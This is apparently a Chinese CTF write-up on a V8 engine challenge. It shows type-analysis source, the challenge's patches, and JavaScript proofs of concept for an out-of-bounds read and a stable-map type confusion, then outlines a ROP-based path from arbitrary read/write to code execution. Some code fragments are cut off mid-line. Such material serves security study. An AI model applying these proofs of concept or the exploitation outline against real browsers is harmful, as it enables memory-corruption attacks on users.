所以我们的第一步就是构造PoC，bypass掉ConstantFoldingReducer，这一步其实非常简单，只要让NumberLessThan在TyperNarrowingReducer的时候，不被类型更新成false就可以了。
#### case3
    function main() {
        let arr = [1.1, 2.2, 3.3, 4.4];
        let idx = 4;
        idx = idx & 0xffff;
        return arr[idx];
    }
    for (i = 0; i 
    Type OperationTyper::NumberBitwiseAnd(Type lhs, Type rhs) {
      DCHECK(lhs.Is(Type::Number()));
      DCHECK(rhs.Is(Type::Number()));
      lhs = NumberToInt32(lhs);
      rhs = NumberToInt32(rhs);
      if (lhs.IsNone() || rhs.IsNone()) return Type::None();
      double lmin = lhs.Min();
      double rmin = rhs.Min();
      double lmax = lhs.Max();
      double rmax = rhs.Max();
      double min = kMinInt;
      // And-ing any two values results in a value no larger than their maximum.
      // Even no larger than their minimum if both values are non-negative.
      double max =
          lmin >= 0 && rmin >= 0 ? std::min(lmax, rmax) : std::max(lmax, rmax);
      // And-ing with a non-negative value x causes the result to be between
      // zero and x.
      if (lmin >= 0) {
        min = 0;
        max = std::min(max, lmax);
      }
      if (rmin >= 0) {
        min = 0;
        max = std::min(max, rmax);
      }
      return Type::Range(min, max, zone());
    }
然后checkbounds的range也被分析成(0,4)  
即取index和length的range的交集。
    Type OperationTyper::CheckBounds(Type index, Type length) {
      DCHECK(length.Is(cache_->kPositiveSafeInteger));
      if (length.Is(cache_->kSingletonZero)) return Type::None();
      Type mask = Type::Range(0.0, length.Max() - 1, zone());
      if (index.Maybe(Type::MinusZero())) {
        index = Type::Union(index, cache_->kSingletonZero, zone());
      }
      return Type::Intersect(index, mask, zone());
    }
    ...
    #35:CheckBounds[VectorSlotPair(INVALID)](#21:SpeculativeNumberBitwiseAnd, #34:NumberConstant, #33:LoadField, #12:JSStackCheck)  [Type: Range(0, 4)]
于是NumberLessThan的left_type即CheckBounds(实际上当成index也可以理解)的范围不再是(4,4)，而是被分析成了(0,4)  
不再满足`left_type.Min() >= right_type.Max())`  
也就不会被折叠了。  
于是最终的PoC就可以给出
    function main() {
        let arr = [1.1, 2.2, 3.3, 4.4];
        let idx = 4;
        idx = idx & 0xffff;
        return arr[idx];
    }
    for (i = 0; i  object,
                                           DependencyGroup group) {
    +#if 0
       Handle old_deps(DependentCode::GetDependentCode(object),
                                      isolate);
       Handle new_deps =
    @@ -932,6 +933,7 @@ void DependentCode::InstallDependency(Isolate* isolate,
       // Update the list head if necessary.
       if (!new_deps.is_identical_to(old_deps))
         DependentCode::SetDependentCode(object, new_deps);
    +#endif
     }
     Handle DependentCode::InsertWeakCode(
    commit 3794e5f0eeee3d421cc0d2a8d8b84ac82d37f10d
    Author: Your Name 
    Date:   Sat Dec 15 18:21:08 2018 +0100
        strip global in realms
    diff --git a/src/d8/d8.cc b/src/d8/d8.cc
    index 98bc56ad25..e72f528ae5 100644
    --- a/src/d8/d8.cc
    +++ b/src/d8/d8.cc
    @@ -1043,9 +1043,8 @@ MaybeLocal Shell::CreateRealm(
         }
         delete[] old_realms;
       }
    -  Local global_template = CreateGlobalTemplate(isolate);
       Local context =
    -      Context::New(isolate, nullptr, global_template, global_object);
    +      Context::New(isolate, nullptr, ObjectTemplate::New(isolate), v8::MaybeLocal());
       DCHECK(!try_catch.HasCaught());
       if (context.IsEmpty()) return MaybeLocal();
       InitializeModuleEmbedderData(context);
题目给了两个patch，第一个patch是禁用了code dependencies，第二个patch应该是禁用了wasm这种利用方法。  
要理解这个patch，就要知道v8中不止有  
实际上注册对arr的type的dependencies的地方在ReduceElementAccess的BuildCheckMaps中，换句话说，如果我们要check的map是stableMap，就直接注册一个
compilation dependencies的回调到map中。  
如果不是，就插入一个checkMap节点到effect chain中。  
可以学习一下[这个漏洞](https://ssd-disclosure.com/archives/3379)，很有趣。
    Reduction JSNativeContextSpecialization::ReduceElementAccess(
      ...
        // Perform map check on the {receiver}.
        access_builder.BuildCheckMaps(receiver, &effect, control,
                                      access_info.receiver_maps());
    ...
    void PropertyAccessBuilder::BuildCheckMaps(
        Node* receiver, Node** effect, Node* control,
        ZoneVector> const& receiver_maps) {
      HeapObjectMatcher m(receiver);
      if (m.HasValue()) {
        MapRef receiver_map = m.Ref(broker()).map();
        if (receiver_map.is_stable()) {
          for (Handle map : receiver_maps) {
            if (MapRef(broker(), map).equals(receiver_map)) {
              dependencies()->DependOnStableMap(receiver_map);
              return;
            }
          }
        }
      }
      ZoneHandleSet maps;
      CheckMapsFlags flags = CheckMapsFlag::kNone;
      for (Handle map : receiver_maps) {
        MapRef receiver_map(broker(), map);
        maps.insert(receiver_map.object(), graph()->zone());
        if (receiver_map.is_migration_target()) {
          flags |= CheckMapsFlag::kTryMigrateInstance;
        }
      }
      *effect = graph()->NewNode(simplified()->CheckMaps(flags, maps), receiver,
                                 *effect, control);
    }
而这个patch就是把install compile dependency的代码给禁用了，所以如果我们使用一个stable
map的arr，将不会有任何的类型检查，于是就有了一个type confusion。
### IR分析
#### case1
非stable map  
#### case2
stable map  
所以给出poc如下：
    arr = [1.1, 2.2, 3.3,4.4];
    // make the map stable
    arr.x = 1;
    function foo(idx) {
        return arr[idx];
    }
    // optimize foo
    for (i = 0; i < 100000; i++){
        foo(1);
    }
    // change arr to dictionary map
    arr[0x100000] = 5.5;
    console.log(foo(1000));
    ...
    ...
    sakura@sakuradeMacBook-Pro:~/Desktop/v8/v8/out/gn$ ./d8 poc.js
    -1.1885946300594787e+148
### 漏洞利用
stephen给出了一种非常精巧的漏洞利用方法，而不是使用wasm rwx内存，实际上这个迟早要被禁用。  
通过poc我们很容易就可以得到任意地址读写的原语。  
为了构建rop链，我们可以使用如下的方法，来自stephen，非常感谢。
  1. leak a binary pointer from the heap
  2. read pointer to kernel32 from IAT
  3. read kernelbase pointer from IAT of kernel32
  4. There's a stack pointer stored in a struct at KERNELBASE!BasepCurrentTopLevelFilter+8
  5. ROP
另外如果challenge只给了v8 binary，而是给了一个chromium的话，也可以参考我博客上关于bug-906043的漏洞利用。